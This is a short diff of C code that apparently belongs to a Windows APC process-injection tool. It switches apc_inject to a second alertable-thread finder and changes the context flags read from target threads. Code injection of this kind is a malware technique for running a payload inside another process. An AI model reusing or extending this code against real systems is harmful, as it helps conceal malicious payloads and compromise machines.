@@ -261,7 +261,7 @@ HANDLE find_alertable_thread2(HANDLE hp, DWORD pid) {
     // for each alertable function
     for(i=0; i<6; i++) {
       // read the thread context
-      c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+      c.ContextFlags = CONTEXT_CONTROL;
       GetThreadContext(ht, &c);
       // save address
       f[i] = (LPVOID)c.Rip;
@@ -325,7 +325,7 @@ VOID apc_inject(DWORD pid, LPVOID payload, DWORD payloadSize) {
     if(hp == NULL) return;
     
     // 2. Find an alertable thread
-    ht = find_alertable_thread1(hp, pid);
+    ht = find_alertable_thread2(hp, pid);
 
     if(ht != NULL) {
       // 3. Allocate memory
